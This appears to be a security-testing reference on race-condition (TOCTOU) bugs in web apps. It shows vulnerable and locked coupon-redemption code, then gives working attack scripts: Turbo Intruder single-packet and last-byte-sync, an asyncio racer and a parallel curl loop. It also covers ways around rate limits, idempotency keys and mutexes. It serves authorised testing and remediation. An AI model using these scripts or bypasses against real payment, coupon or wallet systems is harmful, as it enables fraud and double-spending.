# Race Condition Hunting Reference

## TOCTOU (Time-of-Check to Time-of-Use)

The fundamental race condition pattern: a gap exists between **checking** a condition and **acting** on it, allowing state to change in between.

```
Timeline:
  Thread A: CHECK(balance >= 100) -----> DEDUCT(balance -= 100)
  Thread B:          CHECK(balance >= 100) -----> DEDUCT(balance -= 100)
  
  Result: balance deducted twice, only had enough for one.
```

### Vulnerable Code (Python/Flask)

```python
@app.route('/redeem', methods=['POST'])
def redeem_coupon():
    coupon = Coupon.query.filter_by(code=request.form['code']).first()
    
    # CHECK - coupon still valid?
    if coupon and not coupon.used:
        # GAP - another request can pass the check here
        apply_discount(current_user, coupon.discount)
        # USE - mark as used (too late)
        coupon.used = True
        db.session.commit()
        return "Discount applied!"
    
    return "Invalid coupon", 400
```

### Secure Code (Python/Flask with DB-level locking)

```python
@app.route('/redeem', methods=['POST'])
def redeem_coupon():
    with db.session.begin():
        # SELECT FOR UPDATE - acquires row lock
        coupon = Coupon.query.filter_by(
            code=request.form['code']
        ).with_for_update().first()
        
        if coupon and not coupon.used:
            coupon.used = True
            apply_discount(current_user, coupon.discount)
            db.session.commit()
            return "Discount applied!"
    
    return "Invalid coupon", 400
```

### Secure Code (Rails with pessimistic locking)

```ruby
def redeem
  Coupon.transaction do
    coupon = Coupon.lock("FOR UPDATE").find_by(code: params[:code])
    
    if coupon && !coupon.used?
      coupon.update!(used: true)
      apply_discount(current_user, coupon)
      render json: { status: "applied" }
    else
      render json: { error: "invalid" }, status: 400
    end
  end
end
```

---

## Race Condition Targets

| Target | Impact | Signal |
|--------|--------|--------|
| Coupon/promo redemption | Multiple discounts from single-use code | `/redeem`, `/apply-coupon`, `/promo` |
| Gift card balance | Drain card multiple times simultaneously | `/gift-card/use`, `/balance/deduct` |
| Limited stock/inventory | Purchase more than available | `/checkout`, `/reserve`, `/add-to-cart` |
| Rate limit bypass | Exceed action limits | Any rate-limited endpoint |
| Email verification | Verify multiple accounts with one token | `/verify-email`, `/confirm` |
| Vote/like manipulation | Multiple votes from single user | `/vote`, `/like`, `/upvote` |
| Payment flows | Pay once, credit multiple times | `/pay`, `/transfer`, `/withdraw` |
| Account balance transfers | Double-spend | `/transfer`, `/send` |
| Invitation/referral abuse | Claim referral bonus multiple times | `/invite/accept`, `/referral/claim` |
| File upload overwrite | Race file operations | `/upload`, file processing endpoints |

---

## Attack Surface Signals

### URL Patterns

```
/api/v1/coupon/redeem
/api/v1/gift-card/apply
/checkout/complete
/account/transfer
/vote/submit
/referral/claim
/verify/token/[token]
/order/place
/wallet/withdraw
/points/redeem
```

### Response Headers (indicating potential)

```
# No anti-CSRF or idempotency enforcement
X-Request-Id: (present but not enforced as idempotency key)
# Missing:
# Idempotency-Key requirement
# X-RateLimit-Remaining: 0 (not enforced server-side)

# HTTP/2 support (enables single-packet attack)
HTTP/2 200
```

### JavaScript Patterns (client-side "protection" only)

```javascript
// Client-side disable after click (trivially bypassed)
button.disabled = true;
button.onclick = null;

// Client-side dedup (meaningless for race)
if (localStorage.getItem('submitted')) return;
localStorage.setItem('submitted', 'true');

// Optimistic UI update without server lock
setState({ balance: balance - amount });
fetch('/api/transfer', { method: 'POST', body: ... });
```

### Tech Stack Signals

| Stack | Vulnerable Pattern | What to Look For |
|-------|-------------------|------------------|
| **Rails** | No `with_lock` or `lock!` | Controllers doing read-then-write without transaction |
| **Node.js** | Async without mutex | `async/await` patterns with shared state, no Redis lock |
| **PHP** | No `SELECT ... FOR UPDATE` | Sequential DB queries without transaction isolation |
| **Django** | No `select_for_update()` | ORM queries without `F()` expressions for atomic updates |
| **Go** | No mutex on shared state | Goroutines accessing shared maps/variables |
| **Java/Spring** | No `@Transactional` with isolation | Service methods without proper isolation level |

---

## Step-by-Step Methodology (10 Steps)

### Step 1: Enumerate State-Changing Endpoints

```bash
# Extract POST/PUT/PATCH/DELETE endpoints from proxy history
grep -E "^(POST|PUT|PATCH|DELETE)" burp_history.txt | sort -u

# Look for endpoints that modify limited resources
grep -iE "(redeem|claim|transfer|withdraw|vote|verify|checkout|apply)" burp_history.txt
```

### Step 2: Identify Shared Mutable State

Map which endpoints modify the same resource:
- Balance fields (credits, points, wallet)
- Boolean flags (used, verified, claimed)
- Counter fields (stock, votes, remaining_uses)
- One-time tokens (verification, password reset)

### Step 3: Check HTTP/2 Support (Single-Packet Attack Feasibility)

```bash
# Check if target supports HTTP/2
curl -sI --http2 https://target.com/ 2>&1 | grep -i "HTTP/2"

# Verbose check with protocol negotiation
curl -vso /dev/null --http2 https://target.com/ 2>&1 | grep -E "ALPN|HTTP/2"

# Using nmap
nmap --script http2-enum -p 443 target.com
```

### Step 4: Capture Baseline Request

Capture a legitimate request for the target action. Note:
- Required headers (auth tokens, cookies, CSRF)
- Request body format
- Expected success/failure responses
- Any idempotency key headers

### Step 5: Prepare Race Payload

Duplicate the request 20-50 times. For single-use resources, all copies should be identical. For balance attacks, each should be a valid transfer.

### Step 6: Synchronize Delivery

Use one of the payload patterns below to deliver all requests within the same TCP packet or with minimal timing skew (< 1ms).

### Step 7: Execute and Observe

Send the race payload. Collect all responses noting:
- How many returned success (200/201)?
- Were resources consumed multiple times?
- Did the total exceed expected limits?

### Step 8: Verify State Change

```bash
# Check if the race succeeded by examining final state
# Example: check balance after transfer race
curl -s -H "Authorization: Bearer $TOKEN" https://target.com/api/balance

# Example: check coupon usage count
curl -s -H "Authorization: Bearer $TOKEN" https://target.com/api/coupon/STATUS_CODE
```

### Step 9: Reproduce Consistently

Race conditions are probabilistic. Run the attack 5-10 times to establish:
- Success rate (what % of attempts exploit the race)
- Window size (how tight is the timing requirement)
- Scaling (does sending more concurrent requests increase success?)

### Step 10: Document with Evidence

Record:
- Exact requests sent (timestamps if possible)
- All responses received
- Before/after state proving the race succeeded
- Business impact calculation
- Recommended fix (DB locks, atomic operations, idempotency keys)

---

## Payload Patterns

### Turbo Intruder - Last-Byte Sync (HTTP/2 Single-Packet Attack)

The most effective technique. Sends all requests in a single TCP packet via HTTP/2 multiplexing.

```python
# Turbo Intruder script - single-packet-attack.py
def queueRequests(target, wordlists):
    engine = RequestEngine(endpoint=target.endpoint,
                           concurrentConnections=1,
                           engine=Engine.BURP2)  # HTTP/2
    
    # Queue all requests with gate
    for i in range(20):
        engine.queue(target.req, gate='race1')
    
    # Open gate - sends all requests in single packet
    engine.openGate('race1')

def handleResponse(req, interesting):
    table.add(req)
```

**For HTTP/1.1 (Last-Byte Sync):**

```python
# Turbo Intruder - last-byte-sync for HTTP/1.1
def queueRequests(target, wordlists):
    engine = RequestEngine(endpoint=target.endpoint,
                           concurrentConnections=30,
                           requestsPerConnection=1,
                           pipeline=False,
                           engine=Engine.THREADED)
    
    # Send all but last byte of each request
    for i in range(30):
        engine.queue(target.req, gate='race1')
    
    # Release final bytes simultaneously
    engine.openGate('race1')

def handleResponse(req, interesting):
    table.add(req)
```

### Python asyncio Race

```python
import asyncio
import aiohttp

async def send_request(session, url, headers, data, request_id):
    async with session.post(url, headers=headers, json=data) as resp:
        body = await resp.text()
        print(f"[{request_id}] Status: {resp.status} | Body: {body[:100]}")
        return resp.status, body

async def race(url, headers, data, count=20):
    connector = aiohttp.TCPConnector(limit=0, force_close=False)
    async with aiohttp.ClientSession(connector=connector) as session:
        # Pre-warm connections
        warmup = [send_request(session, url.replace('/redeem', '/health'), headers, None, f"warmup-{i}") 
                  for i in range(count)]
        await asyncio.gather(*warmup, return_exceptions=True)
        
        # Fire race requests simultaneously
        tasks = [send_request(session, url, headers, data, i) for i in range(count)]
        results = await asyncio.gather(*tasks, return_exceptions=True)
        
        success_count = sum(1 for r in results if isinstance(r, tuple) and r[0] == 200)
        print(f"\n[*] Success count: {success_count}/{count}")
        if success_count > 1:
            print("[!] RACE CONDITION CONFIRMED")

if __name__ == "__main__":
    asyncio.run(race(
        url="https://target.com/api/coupon/redeem",
        headers={
            "Authorization": "Bearer eyJ...",
            "Content-Type": "application/json"
        },
        data={"code": "SINGLE-USE-COUPON"},
        count=20
    ))
```

### curl Parallel

```bash
#!/bin/bash
# race-curl.sh - Parallel curl race condition exploit
URL="https://target.com/api/redeem"
TOKEN="Bearer eyJ..."
DATA='{"code":"PROMO2024"}'
COUNT=20

# Create request function
fire() {
    curl -s -o /dev/null -w "Status: %{http_code} | Time: %{time_total}s\n" \
        -X POST "$URL" \
        -H "Authorization: $TOKEN" \
        -H "Content-Type: application/json" \
        -d "$DATA"
}

# Export for parallel execution
export -f fire
export URL TOKEN DATA

# Fire all requests simultaneously
echo "[*] Sending $COUNT parallel requests..."
seq $COUNT | xargs -P $COUNT -I {} bash -c 'fire'

# Alternative using GNU parallel
# seq $COUNT | parallel -j $COUNT fire
```

### Burp Suite - Repeater Group (Send in Parallel)

1. Capture the target request in Burp Repeater
2. Duplicate the tab 20+ times (Ctrl+R)
3. Select all tabs → Right-click → "Add tab to group" → Create new group
4. Select the group → Click "Send group (parallel)"
5. Compare responses - multiple 200s on single-use resource = race condition

**Burp Intruder (Pitchfork with Race condition mode):**
- Set attack type to "Pitchfork"
- Under "Resource Pool" → Create new pool → Set concurrent requests to max
- Use Null payloads with "Generate" count matching desired parallelism

---

## Common Root Causes

| # | Root Cause | Example |
|---|-----------|---------|
| 1 | **Read-then-write without locking** | Check balance → deduct (no row lock between) |
| 2 | **Application-level checks without DB enforcement** | `if not used` in code but no UNIQUE constraint |
| 3 | **Non-atomic counter operations** | `UPDATE SET count = count - 1` vs `SELECT count; UPDATE SET count = $count - 1` |
| 4 | **Session-based state without server-side sync** | Relying on session variable for "already submitted" |
| 5 | **Async processing without deduplication** | Job queue processes same event multiple times |
| 6 | **Optimistic concurrency without retry/conflict handling** | No version column or ETag check |
| 7 | **Distributed systems without distributed locks** | Multiple app servers, no Redis/ZooKeeper coordination |
| 8 | **Client-side enforcement only** | Button disable, JS dedup, frontend rate limiting |

---

## Bypass Techniques Against Defenses

### 1. Rate Limiting Bypass

```
# IP rotation
X-Forwarded-For: 127.0.0.{1-255}
X-Real-IP: 10.0.0.{1-255}

# If rate limit is per-endpoint, try path variations
POST /api/v1/redeem
POST /api/v1/redeem/
POST /api/v1//redeem
POST /API/V1/REDEEM

# If rate limit uses sliding window, burst within window reset
# Send all requests within 1ms (before counter increments)
```

### 2. Idempotency Key Bypass

```
# Use unique idempotency keys per request (defeats dedup)
Idempotency-Key: unique-uuid-1
Idempotency-Key: unique-uuid-2
...

# Omit the key entirely (some implementations don't enforce)
# (remove Idempotency-Key header)

# Empty or null key
Idempotency-Key: 
Idempotency-Key: null
```

### 3. DB Unique Constraint Bypass

```sql
-- If constraint is on (user_id, coupon_id), try:
-- Different user accounts with same coupon
-- If constraint is on (coupon_code), race still works if 
-- the INSERT happens after the check but constraint isn't on the check

-- Exploit: if app does SELECT then INSERT (not INSERT ... ON CONFLICT)
-- the race window exists between SELECT and INSERT
```

### 4. Short Time Windows

```python
# Increase parallelism to hit tighter windows
# Use HTTP/2 single-packet (0ms skew between requests)
# Pre-warm TCP connections before firing
# Use same connection for all requests (connection reuse)

# Turbo Intruder with connection warming:
engine = RequestEngine(endpoint=target.endpoint,
                       concurrentConnections=1,
                       engine=Engine.BURP2)  # Single connection, HTTP/2 multiplex
```

### 5. Queue/Serialization Bypass

```
# If requests are serialized per-user, use multiple sessions:
Cookie: session=session_A  (same user, different session)
Cookie: session=session_B

# If serialized per-connection, use multiple connections
# Turbo Intruder: concurrentConnections=30

# If queue is FIFO with dedup, modify non-significant request fields:
{"code": "PROMO", "padding": "a"}
{"code": "PROMO", "padding": "b"}
```

### 6. Application-Layer Mutex Bypass

```
# If mutex is per-process (not distributed), target different app servers
# Use different source IPs to hit different load balancer targets

# If mutex key is predictable, try adjacent resources:
# Lock on user_id=123? Try from user_id=124 if resource is shared

# If mutex has timeout, delay and retry after lock expires
sleep 5 && resend_request
```

### 7. "Already Used" Check Bypass

```
# Race the check itself - send requests before the flag is set
# The window is between:
#   1. First request passes "not used" check
#   2. First request sets "used = true"
# All requests arriving in this window pass the check

# Increase window by adding latency to the target:
# - Large request body (slow parsing)
# - Complex operations that delay the write
# - Trigger GC pause (memory pressure)
```

---

## Gate 0 Validation

Before investing time in race condition testing, answer these three questions:

### Question 1: Is there shared mutable state?

> Does the endpoint modify a resource that has a finite/limited property?
> (balance, stock count, boolean flag, one-time token, usage counter)
> 
> If NO → Not a race condition target. Move on.

### Question 2: Is the check-then-act pattern present?

> Does the application read state, make a decision, then write state in separate steps?
> (vs. atomic operation like `UPDATE ... WHERE used = false SET used = true`)
> 
> If atomic → Race unlikely unless isolation level is wrong. Lower priority.

### Question 3: Can you send parallel authenticated requests?

> Do you have valid credentials/tokens that allow multiple simultaneous requests?
> Is there anything preventing parallel delivery? (WAF, connection limits, mandatory delays)
> 
> If NO → Need to solve access first. Check for HTTP/2 support for single-packet.

**All three YES → Proceed with race condition testing.**

---

## HTTP/2 Single-Packet Check

```bash
# Quick check: does the target support HTTP/2?
curl -sI --http2 https://target.com 2>&1 | head -1
# Expected: HTTP/2 200

# Detailed ALPN negotiation check
openssl s_client -alpn h2 -connect target.com:443 </dev/null 2>&1 | grep "ALPN"
# Expected: ALPN protocol: h2

# If HTTP/2 is supported, single-packet attack is feasible
# All multiplexed requests arrive in one TCP packet = zero timing skew
# This is the gold standard for race condition exploitation
```

---

## Quick Reference: Attack Decision Tree

```
1. Find state-changing endpoint
2. Identify limited resource (balance, flag, counter, token)
3. Check HTTP/2 support
   ├── YES → Single-packet attack (Turbo Intruder BURP2 engine)
   └── NO  → Last-byte sync (HTTP/1.1) or parallel connections
4. Send 20+ identical requests simultaneously
5. Count success responses
   ├── Multiple successes → CONFIRMED race condition
   └── Single success → Try more parallelism, different timing, or bypass defenses
6. Verify state change (check balance/counter/flag)
7. Document impact and recommend fix
```
